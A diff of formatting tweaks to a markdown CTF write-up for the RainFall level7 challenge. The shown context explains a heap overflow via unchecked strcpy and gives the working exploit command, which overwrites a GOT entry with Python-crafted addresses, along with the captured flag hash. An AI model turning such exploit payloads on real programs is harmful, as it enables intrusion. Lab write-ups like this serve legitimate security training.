@@ -23,6 +23,7 @@
 ```
 
 ### Explanation
+
 Here, the binary allocates a first block of `8 bytes`.  
 In the first half (size: `4 bytes`), it stores an integer value (`1`), and in the second half, it stores a pointer (size: `4 bytes`) to a second address space, provided by another malloc (`8 bytes`).  
 In this second address space, the binary will use `strcpy()` to copy the `argv[1]` parameter without performing any checks for a potential `buffer overflow`.  
@@ -94,8 +95,8 @@ int puts(const char *s);
 ```
 
 ## Step 2: Exploiting the Binary
+
 ```bash
 level7@RainFall:~$ ./level7 "$(python -c 'print(("A" * 20) + ("\x08\x04\x99\x28"[::-1]))')" "$(python -c 'print(("\x08\x04\x84\xf4"[::-1]))')"
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-level7@RainFall:~$
 ```
